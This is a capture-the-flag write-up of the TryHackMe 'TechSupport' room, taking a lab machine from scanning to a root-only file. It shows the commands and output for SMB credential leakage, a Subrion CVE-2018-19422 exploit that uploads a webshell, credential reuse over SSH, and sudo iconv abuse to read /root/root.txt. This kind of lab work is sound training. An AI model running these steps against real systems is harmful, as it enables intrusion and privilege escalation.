## TechSupport01

Room link: https://tryhackme.com/room/techsupp0rt1

## Scanning 
```
ajread@aj-ubuntu:~$ nmap -A [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-16 21:27 EDT
Nmap scan report for [Remote IP]
Host is up (0.10s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-05-17T06:57:53+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-17T01:27:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.52 seconds
```

## Enumeration 
I saw that there was a http server running on port 80. I ran ```nikto``` to see if there are any glaring vulnerabilities. 
```
ajread@aj-ubuntu:~$ nikto -h [Remote IP]
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          [Remote IP]
+ Target Hostname:    [Remote IP]
+ Target Port:        80
+ Start Time:         2022-05-16 21:30:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2c39 0x5c367f4428b1f 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ Uncommon header 'link' found, with contents: </wordpress/index.php/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-05-16 21:42:14 (GMT-4) (679 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
I also ran ```nikto``` and pointed at the ```wordpress``` subdomain. 
```
ajread@aj-ubuntu:~$ nikto -h http://[Remote IP]/wordpress
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          [Remote IP]
+ Target Hostname:    [Remote IP]
+ Target Port:        80
+ Start Time:         2022-05-16 21:31:48 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'link' found, with contents: </wordpress/index.php/index.php/wp-json/>; rel="https://api.w.org/"
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ Server leaks inodes via ETags, header found with file /wordpress/wp-content/plugins/akismet/readme.txt, fields: 0xa6c 0x5bc91a6024640 
+ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ OSVDB-3092: /wordpress/license.txt: License file found may identify site software.
+ Cookie wordpress_test_cookie created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-05-16 21:43:26 (GMT-4) (698 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
There didnt appear to be anything glaring in either ```nikto``` outputs. Therefore, I attempted to enumerate the SMB side of the remote machine. 
```
ajread@aj-ubuntu:~$ smbclient -L [Remote IP]
Enter WORKGROUP\ajread's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
I checked out what sat in ```websvr``` share. 
```
ajread@aj-ubuntu:~$ smbclient -U anonymous //[Remote IP]/websvr
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

		8460484 blocks of size 1024. 5680216 blocks available
smb: \> 
```
I downloaded the ```enter.txt``` file and found some interesting information. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ cat enter.txt 
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:[REDACTED] [cooked with magical formula]
Wordpress creds
|->
```
## Initial Access
I dropped the credentials into [CyberChef](https://gchq.github.io/CyberChef/) and found the password for the ```admin``` user on Subrion. I didnt find the url through directory enumeration but I did find references to a Subrion panel. So, I connected to ```http://[Remote IP]/subrion/panel/``` and logged in with the credentials found in the ```enter.txt``` file. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 49876.py -u http://[Remote IP]/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://[Remote IP]/subrion/panel/
[+] Success!
[+] Got CSRF token: ZKHFY91qSn9lg4xiQBL86zlohp6V13UZeqwcRfpI
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: ipmdnscabuyyxrn

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://[Remote IP]/subrion/panel/uploads/ipmdnscabuyyxrn.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data
```
With some hints from ```https://www.infosecarticles.com/tech-support-tryhackme-walkthrough/```, I did some recon to find a ```wp-config.php``` file in the ```wordpress``` directory. 
```
$ ls -la /var/www/html/wordpress/wp-config.php
-rwxr-xr-x 1 www-data www-data 2992 May 29  2021 /var/www/html/wordpress/wp-config.php
```
The file had credentials for an SQL database. 
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', '[REDACTED]' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
Then, I was able to use the credentials and ssh into the target with a username that I saw in the home folder earlier. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ ssh scamsite@[Remote IP]
scamsite@[Remote IP]'s password: 

scamsite@TechSupport:/$ whoami
scamsite
scamsite@TechSupport:/$ id
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
```
I looked for what I could run as sudo.
```
scamsite@TechSupport:/$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
## Privilege Escalation
I checked GTFO Bins to see my options. It looks like running ```inconv``` with ```8859_1``` encoding allows you to run any single-byte sequence (```https://gtfobins.github.io/gtfobins/iconv/```). With that information, I was able to read the root flag! 
```
scamsite@TechSupport:/$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
[REDACTED] -
scamsite@TechSupport:/$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt" |  wc -c
44
```

## Assistance 
As referenced earlier, I used ```https://www.infosecarticles.com/tech-support-tryhackme-walkthrough/``` to point me to the credentials in the ```wp-config.php``` file to ssh. After that point, the walkthrough was not used. 